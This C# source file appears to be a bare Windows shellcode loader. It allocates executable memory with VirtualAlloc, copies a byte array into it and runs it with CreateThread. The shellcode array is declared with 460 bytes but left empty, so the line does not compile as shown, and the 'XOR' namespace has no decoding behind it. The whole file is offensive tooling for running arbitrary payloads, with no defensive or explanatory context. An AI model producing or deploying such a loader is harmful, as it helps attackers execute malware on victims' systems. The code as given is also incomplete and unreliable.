using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace XOR
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            byte[] shellcode = new byte[460] {};

            IntPtr address = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, address, shellcode.Length);
            uint threadId;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, address, IntPtr.Zero, 0, out threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            VirtualFree(address, 0, 0x8000);
        }
    }
}
